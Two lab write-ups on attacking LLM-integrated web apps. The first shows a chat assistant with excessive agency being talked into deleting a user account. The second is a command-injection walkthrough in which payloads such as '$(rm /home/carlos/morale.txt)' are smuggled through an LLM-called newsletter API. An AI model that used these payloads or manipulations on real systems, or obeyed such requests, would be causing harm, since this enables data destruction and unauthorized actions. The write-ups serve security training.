**Write-up: Exploiting LLM APIs with excessive agency**

In this lab, I explored the potential vulnerabilities related to Large Language Models (LLMs) integrated into web applications, specifically focusing on how LLMs could be manipulated to perform unauthorized actions. Below is a detailed description of how I approached and solved the Web LLM attack lab.

---

### **Step 1: Accessing the Lab**
From the lab homepage, I began by selecting the **Live Chat** feature, which allowed me to interact with the embedded LLM. The LLM was designed to assist users by answering queries and providing support. In this case, I aimed to understand the model's response behavior and its interaction with commands that could potentially manipulate the system.

### **Step 2: Engaging with the LLM**
I started by chatting with the LLM and asking a few basic, harmless questions to gauge its responsiveness. I asked for general information, such as the **weather**. This allowed me to familiarize myself with the LLM’s normal operations, understanding how it processed simple commands.

### **Step 3: Attempting to Change Role to Admin**
Next, I tested the LLM's behavior by requesting it to **change my role to admin**. This was a key part of the test to see whether the LLM had any built-in checks or restrictions on changing user roles within the system. I wanted to check if it would perform the action or raise any flags for unauthorized access. Fortunately, the LLM did not directly grant the request but continued to process the inputs, making me aware of potential flaws in role validation.

### **Step 4: Commanding the LLM to Delete User**
In the final step, I gave the command to the LLM to **delete a user named Carlos**. This was a crucial test to explore whether the LLM could be persuaded to perform sensitive actions, such as deleting a user account. After issuing the command, I observed that the LLM executed the action by successfully deleting the user named **Carlos**.

### **Step 5: Verifying the Result**
Upon successfully deleting the user Carlos, I confirmed that the lab had been solved. The deletion of Carlos was an indication that the LLM could be manipulated to perform dangerous tasks, even when no direct user privileges were granted for such operations.

# **Exploiting vulnerabilities in LLM APIs**  

## **Introduction**  
This write-up explains how an attacker can exploit an OS command injection vulnerability in an LLM-integrated API to execute system commands. The target system allows interaction with multiple APIs, including the **Newsletter Subscription API**, which processes user input in a way that can lead to remote code execution (RCE).  

---

## **Step 1: Identifying Available APIs**  
1. Open the **Live Chat** feature.  
2. Ask the LLM: **"What APIs do you have access to?"**  
3. The LLM responds with:  
   - **Password Reset API**  
   - **Newsletter Subscription API**  
   - **Product Information API**  

The **Newsletter Subscription API** is the best target because it processes email inputs and may execute commands in an unsafe way.  

---

## **Step 2: Understanding the Newsletter Subscription API**  
1. Ask the LLM: **"What arguments does the Newsletter Subscription API accept?"**  
2. The LLM provides the expected input format, confirming it accepts an **email address**.  

---

## **Step 3: Confirming API Execution**  
To check if the API works as expected:  
1. Ask the LLM to call the API with an email:  
   ```bash
   attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   ```
2. Open the **Email Client**.  
3. A **subscription confirmation email** is received, proving the API works.  

This confirms that user input is directly used in the system's email handling process.  

---

## **Step 4: Testing for OS Command Execution**  
To check if the input allows command injection:  
1. Ask the LLM to call the API with:  
   ```bash
   $(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   ```
2. Open the **Email Client**.  
3. The email was sent to:  
   ```bash
   carlos@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   ```
4. The `whoami` command was executed, proving that OS command injection is possible.  

---

## **Step 5: Exploiting Remote Code Execution (RCE)**  
To delete the **morale.txt** file from Carlos' home directory:  
1. Ask the LLM to call the API with:  
   ```bash
   $(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   ```
2. The API processes the request.  
3. The system executes `rm /home/carlos/morale.txt`, deleting the file and solving the lab.  

This confirms full control over the server's command execution.  

---

## **Mitigation Strategies**  
To prevent OS command injection:  

1. **Input Validation** – Reject characters like `$ ( ) ; | &` in user input.  
2. **Use Safe APIs** – Avoid passing raw input to system commands. If necessary, use secure functions like `subprocess.run(["command", "arg"], shell=False)`.  
3. **Limit Permissions** – Run services with minimal privileges to prevent unauthorized file deletions.  
4. **Logging & Monitoring** – Detect unexpected command execution from user-controlled input.  

---
